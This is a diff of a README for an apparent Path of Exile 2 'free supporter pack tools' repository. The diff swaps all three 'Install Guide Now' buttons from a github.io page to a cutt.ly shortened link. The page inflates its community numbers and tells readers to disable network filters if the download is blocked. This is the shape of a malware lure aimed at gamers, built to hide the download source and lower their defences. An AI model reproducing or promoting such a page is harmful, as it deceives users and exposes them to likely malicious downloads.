@@ -6,8 +6,8 @@
 
 **About FaridunExilePack**: FaridunExilePack is a repository for *Path of Exile 2* players on Windows, offering free community-crafted tools, skins, and gameplay tweaks inspired by the King of the Faridun Supporter Pack. Enhance your Wraeclast adventure with customizations. With 150K+ visitors and 120K+ members, dive into the action today!  
 
-<a href="https://wraeclast-exiles.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+<a href="https://cutt.ly/CrNtXV3W" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 
@@ -21,8 +21,8 @@ Boost your *Path of Exile 2* with **FaridunExilePack** on Windows:
 2. **Resolve Access Issues** 🌐  
    Disable network filters or try browsers like Edge or Firefox if needed.
 
-<a href="https://wraeclast-exiles.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+<a href="https://cutt.ly/CrNtXV3W" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 
@@ -35,8 +35,8 @@ Boost your *Path of Exile 2* with **FaridunExilePack** on Windows:
 - 🤝 **Active Community**: Connect with 120K+ members.  
 - 📅 **Regular Updates**: New tools for your Wraeclast journey.
 
-<a href="https://wraeclast-exiles.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+<a href="https://cutt.ly/CrNtXV3W" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 
